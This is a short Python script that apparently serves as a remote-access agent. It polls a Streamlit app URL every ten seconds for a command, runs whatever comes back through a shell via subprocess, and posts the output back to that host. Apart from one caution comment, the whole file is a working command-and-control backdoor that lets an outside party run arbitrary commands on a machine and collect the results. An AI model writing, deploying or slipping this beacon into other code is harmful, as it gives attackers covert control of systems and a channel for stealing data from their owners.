import time
import requests
import json

# Replace with your Streamlit app URL (make sure it's publicly accessible)
STREAMLIT_URL = "https://middleman.streamlit.app/"

def get_command():
    # Poll the command file (this is a simplified example)
    try:
        r = requests.get(f"{STREAMLIT_URL}/get_command")  # You’d need to set up proper endpoint routing
        cmd_data = r.json()
        return cmd_data.get("command", "")
    except Exception as e:
        return ""

def post_result(result):
    try:
        payload = {"result": result}
        requests.post(f"{STREAMLIT_URL}/post_result", json=payload)
    except Exception as e:
        pass

while True:
    command = get_command()
    if command:
        # Execute the command (caution: this is dangerous; use in controlled environments)
        try:
            output = __import__('subprocess').check_output(command, shell=True, stderr=-2).decode()
        except Exception as e:
            output = str(e)
        post_result(output)
    time.sleep(10)  # Poll every 10 seconds
